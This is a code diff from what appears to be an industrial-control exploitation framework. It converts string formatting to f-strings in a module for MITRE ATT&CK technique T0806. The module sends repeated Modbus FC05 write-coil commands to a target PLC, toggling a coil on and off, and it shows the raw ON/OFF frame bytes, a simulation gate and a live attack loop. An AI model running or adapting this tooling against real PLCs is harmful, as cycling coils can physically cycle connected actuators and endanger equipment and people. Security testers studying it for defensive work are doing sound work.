@@ -85,25 +85,19 @@ class Exploit(Exploit):
             total_time = self.iterations * self.interval / 1000
             DestructiveGate.print_simulation(
                 description=(
-                    "T0806: Would send {} FC05 coil toggle commands to {}:{} "
-                    "at {}ms intervals ({}s total). "
-                    "Coil {} would cycle ON/OFF, potentially cycling connected actuators.".format(
-                        self.iterations, self.target, self.port,
-                        self.interval, total_time, self.address
-                    )
+                    f"T0806: Would send {self.iterations} FC05 coil toggle commands to {self.target}:{self.port} "
+                    f"at {self.interval}ms intervals ({total_time}s total). "
+                    f"Coil {self.address} would cycle ON/OFF, potentially cycling connected actuators."
                 ),
                 payload_hex=(
-                    "ON:  00 01 00 00 00 06 {:02X} 05 {:04X} FF 00\n"
-                    "OFF: 00 01 00 00 00 06 {:02X} 05 {:04X} 00 00".format(
-                        self.unit_id, self.address, self.unit_id, self.address
-                    )
+                    f"ON:  00 01 00 00 00 06 {self.unit_id:02X} 05 {self.address:04X} FF 00\n"
+                    f"OFF: 00 01 00 00 00 06 {self.unit_id:02X} 05 {self.address:04X} 00 00"
                 ),
                 mitre_techniques=["T0806"],
             )
             return
 
-        print_status("[T0806 LIVE] Cycling coil {} on {}:{} ({} iterations)…".format(
-            self.address, self.target, self.port, self.iterations))
+        print_status(f"[T0806 LIVE] Cycling coil {self.address} on {self.target}:{self.port} ({self.iterations} iterations)…")
         state = True
         for i in range(self.iterations):
             try:
@@ -122,7 +116,7 @@ class Exploit(Exploit):
                 state = not state
                 time.sleep(self.interval / 1000.0)
             except Exception as exc:
-                print_error("[T0806] Error at iteration {}: {}".format(i+1, exc))
+                print_error(f"[T0806] Error at iteration {i+1}: {exc}")
                 break
 
-        print_success("[T0806] I/O cycling complete ({} iterations).".format(self.iterations))
+        print_success(f"[T0806] I/O cycling complete ({self.iterations} iterations).")
